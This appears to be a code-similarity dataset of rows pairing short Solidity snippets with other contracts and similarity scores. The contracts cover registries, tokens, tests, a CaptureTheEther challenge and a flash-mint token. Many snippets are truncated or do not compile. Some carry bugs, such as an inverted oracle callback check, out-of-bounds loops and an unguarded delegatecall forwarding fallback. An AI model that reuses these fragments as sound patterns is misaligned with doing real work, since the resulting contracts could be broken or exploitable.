        }

    

        whitepapers[_contract].push(Whitepaper(_version, _ipfsHash));

        emit Post(_contract, _version, _ipfsHash, msg.sender);

        return true;

    }

  

    

    function getWhitepaperAt (address _contract, uint256 _index) public view returns (

        uint256 version,

        string ipfsHash,

        address author

    ) {

        return (

            whitepapers[_contract][_index].version,

            whitepapers[_contract][_index].ipfsHash,

            authors[_contract]

        );

    }

    

    

    function getLatestWhitepaper (address _contract) public view returns (

        uint256 version,

        string ipfsHash,

        address author

    ) {

        uint256 latest = whitepapers[_contract].length - 1;

        return getWhitepaperAt(_contract, latest);

    }

}"
"contract A {

   function sendValue(B _externalContract, uint _value) {
     _externalContract.acceptValue(_value);
   }
}",0.5996763910424879,"contract KnownContract {
    function transfered(address _sender, uint256 _value, bytes32[] _data) external;
}"
"contract VatValidator is usingOraclize {

    string public isValid;

    event newOraclizeQuery(string description);
    event newVATResult(string price);


    constructor() public {
        
        OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);
    }

    function __callback(bytes32 myid, string memory result, bytes memory proof) public {
        require (msg.sender != oraclize_cbAddress());
        isValid = result;
        emit newVATResult(isValid);
        update();
    }

    function update() public payable {

        emit newOraclizeQuery(""Oraclize query was sent, standing by for the answer."");

        oraclize_query(""URL"", ""json(http:

    }
}",0.5525564648457674,"contract OraclizeI {



    address public cbAddress;

    function setProofType(byte _proofType) external;



    function setCustomGasPrice(uint _gasPrice) external;



    function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);

    function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);



    function query(uint _timestamp, string _datasource, string _arg)

        external

        payable

        returns (bytes32 _id);



    function getPrice(string _datasource) public returns (uint _dsprice);

}"
"contract RFID {

    struct StateStruct {
        bytes32 description;
        mapping(bytes32 => bytes32) sub_state;
    }

    struct ObjectStruct {
        StateStruct state;
        address owner; 
        bool isObject;
    }

    mapping(bytes32 => ObjectStruct) objectStructs;
    bytes32[] public objectList;

    event LogNewObject(address sender, bytes32 indexed id, bytes32 sub_states_types, bytes32 sub_states_values, address owner);
    event LogChangeObjectState(address sender, bytes32 indexed id, bytes32 sub_states_types, bytes32 sub_states_values);
    event LogChangeObjectOwner(address sender, bytes32 indexed id, address newOwner);

    function isObject(bytes32 _id) public view returns(bool isIndeed) {
        return objectStructs[_id].isObject;
    }

    function getObjectCount() public view returns(uint count) {
        return objectList.length;
    }

    

    function newObject(bytes32 _id, uint256 number_of_sub_states, bytes32[10] sub_states_types, bytes32[10] sub_states_values, address _owner) public returns(bool success) {
        require(!isObject(_id));

        uint256 counter=0;
        for(counter; counter < number_of_sub_states; counter++) {

            objectStructs[_id].state.sub_state[sub_states_types[counter]] = sub_states_values[counter];

            emit LogNewObject(msg.sender, _id, bytes32(sub_states_types[counter]), bytes32(sub_states_values[counter]), _owner);

        }

        objectStructs[_id].owner = _owner;
        objectStructs[_id].isObject = true;

        objectList.push(_id);

        return true;
    }

    function changeObjectState(bytes32 _id, uint256 number_of_sub_states, bytes32[10] sub_states_types, bytes32[10] sub_states_values) public returns(bool success) {
        require(isObject(_id));
        uint256 counter=0;
        for(counter; counter < number_of_sub_states; counter++) {

            objectStructs[_id].state.sub_state[sub_states_types[counter]] = sub_states_values[counter];

            emit LogChangeObjectState(msg.sender, _id, bytes32(sub_states_types[counter]), bytes32(sub_states_values[counter]));

        }
        
        
        return true;
    }

    function changeObjectOwner(bytes32 _id, address _newOwner) public returns(bool success) {
        require(isObject(_id));
        objectStructs[_id].owner = _newOwner;
        emit LogChangeObjectOwner(msg.sender, _id, _newOwner);
        return true;
    }

}",0.5520767672149514,"contract StonToken is MiniMeToken {
    uint256 public constant maxSupply = 370 * 10**6 * 10**8;

    bool public mintingDone = false;

    
    address public whitelistManager;
    mapping(address => bool) public whitelist;

    event WhitelistEdit(address indexed subject, bool indexed status);
    event WhitelistManagerChange(address indexed manager);

    constructor() public MiniMeToken(
        address(0), 
        0,          
        ""STON"",     
        8,          
        ""STON"",     
        false       
    ) {
        whitelistManager = msg.sender;
        emit WhitelistManagerChange(msg.sender);
    }

    

    function mint(address[] memory _recipients, uint256[] memory _amounts) public onlyOwner {
        require(!mintingDone);
        require(_recipients.length == _amounts.length);
        require(_recipients.length < 255);

        for (uint8 i = 0; i < _recipients.length; i++) {
            address recipient = _recipients[i];
            uint256 amount = _amounts[i];

            require(generateTokens(recipient, amount));
        }
    }

    function finishMinting() public onlyOwner {
        require(!mintingDone);

        
        assert(totalSupply() <= maxSupply);

        enableTransfers(true);
        mintingDone = true;
    }

    

    function addWhitelist(address _subject) public returns (bool) {
        return modifyWhitelist(_subject, true);
    }

    function removeWhitelist(address _subject) public returns (bool) {
        return modifyWhitelist(_subject, false);
    }

    function modifyWhitelist(address _subject, bool _status) internal returns (bool) {
        require(msg.sender == whitelistManager, ""Only the whitelist manager can edit it."");

        if (_status == whitelist[_subject]) {
            
            return false;
        }

        whitelist[_subject] = _status;
        emit WhitelistEdit(_subject, _status);
        return true;
    }

    function modifyWhitelistMultiple(address[] memory _subjects, bool _status) public {
        require(msg.sender == whitelistManager, ""Only the whitelist manager can edit it."");
        require(_subjects.length < 255);

        for (uint8 i = 0; i < _subjects.length; i++) {
            address subject = _subjects[i];
            
            
            
            whitelist[subject] = _status;
            emit WhitelistEdit(subject, _status);
        }
    }

    function changeWhitelistManager(address _manager) public onlyOwner {
        whitelistManager = _manager;
        emit WhitelistManagerChange(_manager);
    }
}"
"contract BookStore {

enum BookStatus { Open, Sold, Unsold }

mapping(uint => Book) stores;
uint public count;

struct Book{  
uint bookId;  
string name;    
BookStatus status;
}

function BookStore() {
count = 0;   
}

function addP(string _name) {
count += 1;
Book memory b1= Book(count,_name,BookStatus.Open);
stores[count] = b1;    
}

function updateStatus (uint _bookId) public {
Book storage b1= stores[_bookId];
b1.status = BookStatus.Sold;
}

function getStatus(uint _bookId) public returns (BookStatus) {
Book storage b1= stores[_bookId];
return b1.status;
}

}",0.5277631296387354,"contract ERC20Interface {

    function totalSupply() public constant returns (uint);

    function balanceOf(address tokenOwner) public constant returns (uint balance);

    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);

    function transfer(address to, uint tokens) public returns (bool success);

    function approve(address spender, uint tokens) public returns (bool success);

    function transferFrom(address from, address to, uint tokens) public returns (bool success);

}"
"contract ContractB {

    uint public supplyB;

    event LogSupplyA(uint supplyA);

    function ContractB () {
        supplyB = 100;
    }

    function deployA() returns (address) {
        ContractA newContract = new ContractA(250);

        newContract.setNewSupply();
        LogSupplyA(newContract.supplyA());

        return newContract;
    }
}",0.5550983325305429,"contract DeployerI {



    mapping(address => uint) public deployedContractPointers;

    address[] public deployedContracts;



    function getDeployedContractsCount() public view returns(uint count);

    function isDeployedContract(address deployed) public view returns(bool isIndeed);



}"
"contract simpleStorage {
    struct BizCard {
        uint id;
        bytes32 name;
        bytes32 email;
        string comment;
    }

    
    uint public count = 0;

    
    mapping (uint => BizCard) cards;

    
    function createCard(uint id, bytes32 name, bytes32 email, string comment) {
        cards[count] = BizCard(id, name, email, comment);
        count++;
    }

    
    function getCard(uint index) constant returns (uint id, bytes32 name, bytes32 email, string comment) {
        id = cards[index].id;
        name = cards[index].name;    
        email = cards[index].email;
        comment = cards[index].comment;
    }

    function getCardById(uint id) constant returns (uint idRet, bytes32 name, bytes32 email, string comment, uint status) {
        for (var i = 0; i < count; i++) {
            if (cards[i].id == id) {
                idRet = cards[i].id;
                name = cards[i].name;
                email = cards[i].email;
                comment = cards[i].comment;
                return;
            }
        }
    }
}",0.5517279553780289,"contract Operations {

    function copyBytesNToBytes(bytes32 source, bytes memory destination, uint[1] memory pointer) internal pure {

        for (uint i=0; i < 32; i++) {

            if (source[i] == 0)

                break;

            else {

                destination[pointer[0]]=source[i];

                pointer[0]++;

            }

        }

    }

    function copyBytesToBytes(bytes memory source, bytes memory destination, uint[1] memory pointer) internal pure {

        for (uint i=0; i < source.length; i++) {

            destination[pointer[0]]=source[i];

            pointer[0]++;

        }

    }

    function uintToBytesN(uint v) internal pure returns (bytes32 ret) {

        if (v == 0) {

            ret = '0';

        }

        else {

            while (v > 0) {





                ret = bytes32(uint(ret) >> 8);

                ret |= bytes32(((v % 10) + 48) << (8 * 31));

                v /= 10;

            }

        }

        return ret;

    }

    function stringToBytes32(string memory str) internal pure returns(bytes32) {

        bytes32 bStrN;

        assembly {

            bStrN := mload(add(str, 32))

        }

        return(bStrN);

    }

}"
"contract SaveData is Whitelist {
function verifyHash(address publicAddress, string hashstring) external returns (string) {
        require(StringUtils.equal(data[publicAddress],hashstring));

    }
}",0.5713483206009544,"contract WhitelistInterface {

  function checkRole(address _operator, string _role) public view;

  function hasRole(address _operator, string _role) public view returns (bool);

}"
"contract Election {

ElectionMaster private electionMaster;
mapping(address => uint8) private voters;
bytes32 private electionName;

constructor(address masterContractAddress, bytes32 nameOfElection) public {
    electionMaster = ElectionMaster(masterContractAddress);
    bool canDeploy = electionMaster.canAddressDeployContract(msg.sender);
    require(canDeploy == true, ""Organizer permissions required to deploy a contract."");
    electionMaster.addElection(address(this), nameOfElection, msg.sender);

    electionName = nameOfElection;
}
}",0.5208394364163207,"contract Ownable {
    address owner;
    Kitty kitty;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address _newOwner) external onlyOwner {
        require(_newOwner != address(0));
        owner = _newOwner;
    }

    function () external payable {
        owner.transfer(address(this).balance);
    }

    function getTokens(address _contract, uint256 _amount) external {
        TokenInterface(_contract).transfer(owner, _amount);
    }

    function setKitty(address _contract) external onlyOwner {
        kitty = Kitty(_contract);
    }
}"
"contract DAppInterface {
    mapping(bytes32 => address) public dataItems;

    function addDataItem(bytes32 k, string v) external {
        dataItems[k] = new DataItem(k, v);
    }
}",0.5538905622437774,"contract SetBBAU is DataCaller {

    function setBBAU(bytes32 _key, bytes32 _id, address _holder, uint256 _value) internal {

        data.setBBAU(_key, _id, _holder, _value);    

    }

}"
"contract Main {

    address payable chairperson;
    uint8 public constant N = 32;
    uint8 public constant M = 32;
    uint256 public constant initialTabPrice = 1 finney;
    uint256 public constant feePercent = 15;
    uint256 public constant referralPercent = 30;
    uint256 public constant appreciationPercent = 200;
    Tab[N][M] public tabs;
    mapping (bytes32 => address payable) referralLinks;

    struct Tab {
        address payable owner;
        uint256 price; 
        bytes32[2] linkUrl;
        bytes32[3] imageUrl;

        
        uint8 x; 
        uint8 X; 
        uint8 y; 
        uint8 Y;
    }

    struct ToPay {
        address payable owner;
        uint256 amount;
    }

    constructor() public {
        chairperson = msg.sender;
    }

    function uint2str(uint i) internal pure returns (string memory){
        if (i == 0) return ""0"";
        uint j = i;
        uint length;
        while (j != 0){
            length++;
            j /= 10;
        }
        bytes memory bstr = new bytes(length);
        uint k = length - 1;
        while (i != 0){
            bstr[k--] = byte(uint8(48 + i % 10));
            i /= 10;
        }
        return string(bstr);
    }

    function bytes32ToString(bytes32 x) internal pure returns (string memory) {
        bytes memory bytesString = new bytes(32);
        uint charCount = 0;
        for (uint j = 0; j < 32; j++) {
            byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));
            if (char != 0) {
                bytesString[charCount] = char;
                charCount++;
            }
        }
        bytes memory bytesStringTrimmed = new bytes(charCount);
        for (uint j = 0; j < charCount; j++) {
            bytesStringTrimmed[j] = bytesString[j];
        }
        return string(bytesStringTrimmed);
    }

    function getTabs(uint8 x1, uint8 y1, uint8 x2, uint8 y2) external view returns(string memory) {
        string memory res = """";
        for (uint8 yt = y1; yt <= y2; yt++) {
            for (uint8 xt = x1; xt <= x2; xt++) {
                 res = string(abi.encodePacked(res, "","", uint2str(getTabPrice(xt,yt)),  "","", bytes32ToString(tabs[xt][yt].linkUrl[0]), bytes32ToString(tabs[xt][yt].linkUrl[1]), "","", bytes32ToString(tabs[xt][yt].imageUrl[0]), bytes32ToString(tabs[xt][yt].imageUrl[1]), bytes32ToString(tabs[xt][yt].imageUrl[2]), ""#"", uint2str(tabs[xt][yt].x), ""."", uint2str(tabs[xt][yt].X), ""."", uint2str(tabs[xt][yt].y), ""."", uint2str(tabs[xt][yt].Y)));
            }
        }  
        return res;
    }

    function getTabPrice(uint8 x, uint8 y) internal view returns(uint256) {
        if (tabs[x][y].price == 0) {
            return initialTabPrice;
        }
        return tabs[x][y].price;
    }

    function getTabOwner(uint8 x, uint8 y) internal view returns(address payable) {
        if (tabs[x][y].price == 0) {
            return chairperson;
        }
        return tabs[x][y].owner;
    }
    

    function buyTabs(uint8[4] calldata z, bytes32[6] calldata s) external payable {
        
        
        uint8 xt;
        uint8 yt;
        uint256 price = 0;
        uint256 tabPrice;
        address payable tabOwner;

        for (xt = z[0]; xt <= z[2]; xt++) {
            for (yt = z[1]; yt <= z[3]; yt++) {
                price += getTabPrice(xt,yt);
            }
        }

        
        assert(msg.value >= price);

        ToPay[1024] memory toPay;

        
        for (xt = z[0]; xt <= z[2]; xt++) {
            for (yt = z[1]; yt <= z[3]; yt++) {
                tabPrice = getTabPrice(xt,yt);
                tabOwner = getTabOwner(xt,yt);

                
                for(uint i=0; i<=toPay.length;i++) {
                    if (toPay[i].amount == 0) {
                        
                        toPay[i].owner = tabOwner;
                        toPay[i].amount = (tabPrice * (100-feePercent)) / 100;
                        break;
                    }

                    if (toPay[i].owner == tabOwner) {
                        toPay[i].amount += (tabPrice * (100-feePercent)) / 100;
                        break;
                    }
                }

                tabs[xt][yt] = Tab(msg.sender, tabPrice * appreciationPercent / 100, [s[0], s[1]] , [s[2], s[3], s[4]], xt-z[0], z[2]-z[0]+1, yt-z[1], z[3]-z[1]+1);
            }
        }

        for(uint i=0; i<=toPay.length;i++) {
            if (toPay[i].amount == 0) {
                break;
            }
            toPay[i].owner.transfer(toPay[i].amount);
        }

        if (s[5][0] != 0) {
            referralLinks[s[5]].transfer(address(this).balance * referralPercent / 100);
        }

        
        chairperson.transfer(address(this).balance);
    }

    function setReferralLink(bytes32 linkName) external {
        referralLinks[linkName] = msg.sender;
    }

    function retrieveLostEther() public {
        assert(msg.sender == chairperson);
        msg.sender.transfer(address(this).balance);
    }
}",0.5865245047762179,"contract Champion is MainBet{

    uint public startTime = 0;

    uint public endTime = 0;



    uint private totalPrize;

    uint private numberBets;

    uint private winner;



    bool private isInit = false;



    struct Country{

        uint totalNum;

        uint totalInvest;

    }



    mapping (address => mapping (uint => uint)) private bets;

    mapping (uint => Country) countrys;



    uint private lucky = 0;



    modifier beforeWinner {

        assert(winner == NOWINNER);

        _;

    }

    modifier beforeInit{

        assert(isInit);

        _;

    }

    function InitCountry(uint _startTime, uint _endTime) internal returns(bool res) {



        startTime = _startTime;

        endTime = _endTime;



        winner = 0;



        totalPrize = 0;

        numberBets = 0;

        isInit = true;

        return true;

    }



    function setChampion(uint _winner) public onlyOwner beforeWinner returns (bool){

        require(_winner>0);



        winner = _winner;



        Country storage country = countrys[_winner];



        for(uint i=0; i<ch_players.length; i++){

            uint myInvest = bets[ch_players[i]][winner];

            if(myInvest>0){

                Player storage player = players[ch_players[i]];

                uint winInest = SafeMath.mul(totalPrize, myInvest);

                uint prize = SafeMath.div(winInest, country.totalInvest);

                player.balance = SafeMath.add(player.balance, prize);

                player.prize = SafeMath.add(player.prize, prize);

            }

        }



        return true;

    }



    function getChampion() public constant returns (uint winnerTeam){

        return winner;

    }



    function BetChampion(uint countryId) public beforeWinner afterTime(startTime) beforeTime(endTime) payable returns (bool)  {

        require(msg.value>0);

        require(countryId>0);



        countrys[countryId].totalInvest = SafeMath.add(countrys[countryId].totalInvest, msg.value);

        countrys[countryId].totalNum = SafeMath.add(countrys[countryId].totalNum, 1);



        bets[msg.sender][countryId] = SafeMath.add(bets[msg.sender][countryId], msg.value);



        totalPrize = SafeMath.add(totalPrize, msg.value);



        numberBets++;



        Player storage player = players[msg.sender];

        if(player.invested>0){

            player.invested = SafeMath.add(player.invested, msg.value);

            player.num = SafeMath.add(player.num, 1);

        }else{

            players[msg.sender] = Player({

                addr: msg.sender,

                balance: 0,

                invested: msg.value,

                num: 1,

                prize: 0,

                claimed: 0

            });

        }



        bool ext = false;

        for(uint i=0; i<ch_players.length; i++){

            if(ch_players[i] == msg.sender) {

                ext = true;

                break;

            }

        }

        if(ext == false){

            ch_players.push(msg.sender);

        }

        return true;

    }



    function getCountryBet(uint countryId) public constant returns(uint[]){

        require(countryId>0);



        Country storage country = countrys[countryId];

        uint[] memory data = new uint[](4);

        data[0] = country.totalNum;

        data[1] = country.totalInvest;

        data[2] = winner;

        if(isInit){

            data[3] = 1;

        }

        return data;

    }



    function getDeepInfo(uint countryId) public constant returns(uint[]){

        require(countryId>0);



        Country storage country = countrys[countryId];

        uint[] memory data = new uint[](10);

        data[0] = country.totalNum;

        data[1] = country.totalInvest;

        data[2] = lucky;

        data[3] = 0;

        data[4] = 0;



        if(winner>0){

            data[4] = 1;

        }

        if(winner == countryId){



            uint myInvest = bets[msg.sender][winner];

            if(myInvest>0){

                uint winInest = SafeMath.mul(totalPrize, myInvest);

                uint prize = SafeMath.div(winInest, country.totalInvest);

                data[2] = 1;

                data[3] = prize;

            }

        }



        return data;

    }



    function getMyBet(uint countryId) public constant returns (uint teamBet) {

       return (bets[msg.sender][countryId]);

    }



    function getChStatus() public constant returns (uint []){

        uint[] memory data = new uint[](3);

        data[0] = totalPrize;

        data[1] = numberBets;

        data[2] = 0;

        if(isInit){

            data[2] = 1;

            if(now > endTime){

                data[2] = 2;

            }

            if(winner > 0){

                data[2] = 3;

            }

        }



        return data;

    }



    function getNumberOfBets() public constant returns (uint num){

        return numberBets;

    }



    function () public payable {

        throw;

    }



}"
"contract taskListContract is Owned {
    struct task {
        bytes iname;
        uint16 taskid;
        bytes icode;
        
        uint ivalue;
    }

    uint taskCount;
    mapping(bytes => task) taskList;
    task[] taskArray;

    
    
    

    function addTask(bytes name, uint16 iid, bytes code, uint val) external onlyOwner{        
        task memory tasknew = task(name, iid ,code, val);
        
        taskList[code] = tasknew;
        taskArray.push(tasknew);
        taskCount++;
    }

    function countItemList() public constant returns (uint count)  {     
        return taskCount;
    }

    function removeTask(bytes code) external onlyOwner {
        delete taskList[code];
        taskCount--;
    }

    function getTask(bytes code) public constant returns (bytes iname, uint val)  {   
        return (taskList[code].iname, taskList[code].ivalue);
    }
}",0.5956152073246617,"contract ERC223 {
  uint public totalSupply;
  function balanceOf(address who) constant returns (uint);
  
  function name() constant returns (string _name);
  function symbol() constant returns (string _symbol);
  function decimals() constant returns (uint8 _decimals);
  function totalSupply() constant returns (uint256 _supply);

  function transfer(address to, uint value) returns (bool ok);
  function transfer(address to, uint value, bytes data) returns (bool ok);
  function transfer(address to, uint value, bytes data, string custom_fallback) returns (bool ok);
  event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract Consumer {
  InfoFeed feed;
  function setFeed(address addr) { feed = InfoFeed(addr); }
  function callFeed() { attribut = feed.info.value(10).gas(800); }  
}",0.5200364429826951,"contract IOwned {
  function owner() public constant returns (address) { owner; }
  function transferOwnership(address _newOwner) public;
}"
"contract TestTodoList {
    TodoList todolist = TodoList(DeployedAddresses.TodoList());

    
    function testUserCanAddTodo() public {
      uint returnedTodo = todolist.createTodo(""test"");

      uint expectedValue = 1;

      Assert.equal(returnedTodo, expectedValue, ""Todo should be added to the list and return 1."");
    }

}",0.5119633300215101,"contract ERC20Basic {
  uint public _totalSupply;
  function totalSupply() constant returns (uint);
  function balanceOf(address who) constant returns (uint);
  function transfer(address to, uint value);
  event Transfer(address indexed from, address indexed to, uint value);
}"
"contract SimpleBidding {

    address contractOwnersAccount;

    
    address public client;
    uint barcode;

    
    uint expectedProposals;
    address bestVendor;
    uint bestPrice;

    
    event AssetRequested(address client, uint barcode);

    
    function SimpleBidding(address _account) {
        contractOwnersAccount = _account;
    }

    
    function dispose() {
        suicide(contractOwnersAccount);
    }

     
    function requestAsset(uint _barcode) {
        
        client = msg.sender;

        
        barcode = _barcode;

        
        AssetRequested(client, barcode);

        
        expectedProposals = 2;
        bestPrice = 999999;
    }
}",0.5678187939417036,"contract TokenState is State {

    
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    
    constructor(address _owner, address _associatedContract)
        State(_owner, _associatedContract)
        public
    {}

    

    
    function setAllowance(address tokenOwner, address spender, uint value)
        external
        onlyAssociatedContract
    {
        allowance[tokenOwner][spender] = value;
    }

    
    function setBalanceOf(address account, uint value)
        external
        onlyAssociatedContract
    {
        balanceOf[account] = value;
    }
}"
"contract User {

             string public userName;
             mapping(address => Service) public services;

             struct Service {
                   bool active;
                   uint lastUpdate;
                   uint256 debt;
            }

            function User(string _name) {
                   userName=_name;
            }

          function registerToProvider(address _providerAddress) {
               services[_providerAddress]=Service({
                        active:true,
                        lastUpdate:now,
                        debt:0
               });

          }

          function setDebt(uint256 _debt) {
                   if(services[msg.sender].active){
                         services[msg.sender].lastUpdate=now;
                         services[msg.sender].debt=_debt;
                   }
                  else {
                        throw;
                  }

         }
         function payToProvider(address _providerAddress) {

              if(!_providerAddress.send(services[_providerAddress].debt)){
                     throw;
              }

       }
       function unsubscribe(address _providerAddress){
            if(services[_providerAddress].debt== 0){
                    services[_providerAddress].active=false;
           }else {
                     throw;
           }

       }

   }",0.5475264336381022,"contract ServiceRegistry is CustodianUpgradeable {

    mapping (string => address) services;



    event ServiceReplaced(string indexed _name, address _oldAddr, address _newAddr);



    constructor(address _custodian) public CustodianUpgradeable(_custodian) {

    }



    function replaceService(string calldata _name, address _newAddr) external onlyCustodian withContract(_newAddr) {

        address _prevAddr = services[_name];

        services[_name] = _newAddr;

        emit ServiceReplaced(_name, _prevAddr, _newAddr);

    }



    function getService(string memory _name) public view returns (address) {

        return services[_name];

    }



    modifier withContract(address _addr) {

        uint length;

        assembly { length := extcodesize(_addr) }

        require(length > 0);

        _;

    }

}"
"contract Test2 {

    Test1 test1;
    function carAdd(string memory _carCreationDate, string memory _carOrigin, address _carOwner) public returns(uint) {
        uint carId = test1.setNewCar(_carCreationDate, _carOrigin, _carOwner);
        return (carId);
    }
}",0.5573959658214565,"contract ERC20TokenBankInterface{
  function balance() public view returns(uint);
  function token() public view returns(address, string memory);
  function issue(address _to, uint _amount) public returns (bool success);
}"
"contract SendBCF {
    BorgiasCapitalFundToken public borgiasCapitalFundToken;

    struct OldToken {
        uint256 value;
        address member;
    }

    OldToken[] public oldTokenList;

    address public owner;

    function SendBCF(address contractAddress) public {
        borgiasCapitalFundToken = BorgiasCapitalFundToken(contractAddress);
        oldTokenList.push(OldToken({ value: 440000000, member: 0x54C340CcD7C35753F6BC638f2eDA9f9443D08876}));
        owner = msg.sender;      
    }

    function finalSend() public {
        for (uint i = 0; i < oldTokenList.length; i++) {
            borgiasCapitalFundToken.transfer(oldTokenList[i].member, oldTokenList[i].value);
        }
    }
}",0.5489387745906761,"contract transferBounties is Ownable {

    

    MiniMeToken public token;

    using SafeMath

    for uint256;

    constructor(MiniMeToken tokenx) public {

        token = tokenx; 

        owner = msg.sender; 

    }



    function tranferPresaleTokens(address investor, uint256 ammount) public onlyOwner {

     

        token.transferFrom(this, investor, ammount);

    }

     function tranferPresaleTokensBulk(address[] _investors, uint256[] ammount) public onlyOwner{

        uint256 i = 0;

        for(i;i<_investors.length;i++){

         token.transferFrom(this, _investors[i], ammount[i]);

            

        }

    }

    

    function changeOwner(address newOwner) public onlyOwner {

        owner = newOwner; 

    }

}"
"contract GameChanger {

    uint ChallengeCount = 0;

    struct Challenge {
        string name;
        address host;
        string description;
        uint starttime;
        uint timelimit;
        uint reward;
        uint challengercount;
        address[] challengers;
    }

    Challenge[] public challenges;

    function createChallenge(string memory name, string memory description, 
        uint timelimit, uint reward) public {

        ChallengeCount++;
        address host = msg.sender;
        uint starttime = now;
        uint challengercount = 0;
        challenges.push(Challenge(name, host, description, starttime,                         
        timelimit, reward, challengercount, new address[](0)));
    }

    function acceptChallenge(uint ChallengeCount) public {

        if (now <= ((challenges[ChallengeCount].starttime)  + 24)) {
            challenges[ChallengeCount].challengers.push(msg.sender);
            challenges[ChallengeCount].challengercount++;
            uint id = challenges[ChallengeCount].challengercount;
            registration[id] = msg.sender;
        }
    }
}",0.5180654547789704,"contract FlashETH is ERC20 {
    using SafeMath for uint256;

    string public name = ""FlashEther"";
    string public symbol = ""FlashETH"";
    uint8 public decimals = 18;

    
    function() external payable {
        _mint(msg.sender, msg.value);
    }

    
    function deposit() public payable {
        _mint(msg.sender, msg.value);
    }

    
    function withdraw(uint256 amount) public {
        _burn(msg.sender, amount); 
        msg.sender.transfer(amount);
    }

    
    
    

    
    
    
    modifier flashMint(uint256 amount) {
        
        _mint(msg.sender, amount); 

        
        _;

        
        _burn(msg.sender, amount); 

        
        require(
            address(this).balance >= totalSupply(),
            ""redeemability was broken""
        );
    }

    
    function softFlashFuck(uint256 amount) public flashMint(amount) {
        
        IBorrower(msg.sender).executeOnFlashMint(amount);
    }

    
    function hardFlashFuck(
        address target,
        bytes memory targetCalldata,
        uint256 amount
    ) public flashMint(amount) {
        (bool success, ) = target.call(targetCalldata);
        require(success, ""external call failed"");
    }
}"
"contract Wallet {
   
  function() payable {
    if (msg.data.length > 0) {
      _walletLibrary.delegatecall(msg.data);
    }
  }
  ...
}",0.515903153266304,"contract sendlimiter{
 function () public payable {
     require(this.balance + msg.value < 100000000);}
}"
"contract myObject {

address owner;
uint4 stage;
uint256 someOtherData;
mapping(address => uint4) someUserInteraction;

constructor(address user) {
owner=user;
stage=0;
}

function interact(address user, uint4 data)
external
...

function changeStage(uint4 new stage)
external
....

}",0.5978321274782642,"contract TokenContract {

  function transferFrom(address _from, address _to, uint256 _value) external returns (bool);

  function balanceOf(address who) external view returns (uint256);

  function allowance(address owner, address spender) external view returns (uint256);

}"
"contract Demo {
    event Deposit(
        address indexed _from,
        bytes32 indexed _id,
        uint256 _value
    );

    function highLevelEvent() public {
        bytes32 _id = hex""420042"";
        emit Deposit(msg.sender, _id, 123);
    }

    function lowLevelEvent() public {
        bytes32 _id = hex""420042"";
        log3(
            bytes32(uint256(123)),
            bytes32(keccak256(""Deposit(address,bytes32,uint256)"")),
            bytes32(uint256(uint160(msg.sender))),
            _id
        );
    }
    
    
    

    function AssemblyEvent() public {
        bytes32 _id = hex""420042"";
        bytes32 t1 = bytes32(uint256(123));
        bytes32 t2 = bytes32(keccak256(""Deposit(address,bytes32,uint256)""));
        bytes32 t3 = bytes32(uint256(uint160(msg.sender)));

        assembly {
            let s := 0x20
            let p := _id
            log3(p, s, t1, t2, t3)
        }
    }
}",0.5368241077321954,"contract ERC20 {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    function mint(address reciever, uint256 value,bytes32[3] memory _mrs, uint8 _v) public returns(bool);
    function transfer(address to, uint256 value) public returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract Test  {

   address dc = 0xaD6D458402F60fD3Bd25163575031ACDce07538D; 
   uint number;
   event Log(uint256 number, bytes b);


    function balanceOf(address _val) public {
      bool status;
      bytes memory b;
      (status, b) = dc.staticcall(abi.encodePacked(bytes4(keccak256(""balanceOf(address)"")), _val));
        emit Log(number, b);
    }}",0.5605132248805472,"contract LoveToken is Ownable{
    uint256 public totalSupply;
    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) returns (bool success);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
}"
"contract B {

    A a = A();
",0.5832012039914727,"contract NGNT is V1 {

}"
"contract CaptureTheEther {
    mapping (address => bytes32) public nicknameOf;

    function setNickname(bytes32 nickname) public {
        nicknameOf[msg.sender] = nickname;
    }
}",0.5891143679608296,"contract RegistrarFakeInterface {
    
    mapping (address => mapping(bytes32 => address)) public sealedBids;
    
    

    
    function cancelBid(address bidder, bytes32 seal);
}"
"contract NicknameChallenge {
    CaptureTheEther cte = CaptureTheEther(msg.sender);
    address player;

    
    function NicknameChallenge(address _player) public {
        player = _player;
    }

    
    function isComplete() public view returns (bool) {
        return cte.nicknameOf(player)[0] != 0;
    }
}",0.5978277715213719,"contract BalanceChecker {
  address public owner;
 

  constructor() public {
    owner = msg.sender;
  }

  function check(address[] memory addresses) public view returns (bool){
    
 
    for(uint i=0; i<addresses.length;i++){
      if(addresses[i].balance != 0){
          return true;
      }
    }
    return false;
    
  }
}"
"contract TestAdoption {
  Adoption adoption = Adoption(DeployedAddresses.Adoption());




    function testUserCanAdoptPet() public {
      uint returnedId = adoption.adopt(8);

      uint expected = 8;

      Assert.equal(returnedId, expected, ""Adoption of pet ID 8 should be recorded."");
    }




function testGetAdopterAddressByPetId() public {
  
  address expected = this;

  address adopter = adoption.adopters(8);

  Assert.equal(adopter, expected, ""Owner of pet ID 8 should be recorded."");
}




function testGetAdopterAddressByPetIdInArray() public {

address expected = this;


address[16] memory adopters = adoption.getAdopters();

Assert.equal(adopters[8], expected, ""Owner of pet ID 8 should be recorded."");
}










  function testUnAdoped() public{


      address expe = this;

      address adopter = adoption.unAdopt(8);

      Assert.equal(adopter, expe, ""no owner"");


 }




}",0.5574136449189008,"contract IERC721 is IERC165 {



  event Transfer(

    address indexed from,

    address indexed to,

    uint256 indexed tokenId

  );

  event Approval(

    address indexed owner,

    address indexed approved,

    uint256 indexed tokenId

  );

  event ApprovalForAll(

    address indexed owner,

    address indexed operator,

    bool approved

  );



  function balanceOf(address owner) public view returns (uint256 balance);

  function ownerOf(uint256 tokenId) public view returns (address owner);



  function approve(address to, uint256 tokenId) public;

  function getApproved(uint256 tokenId)

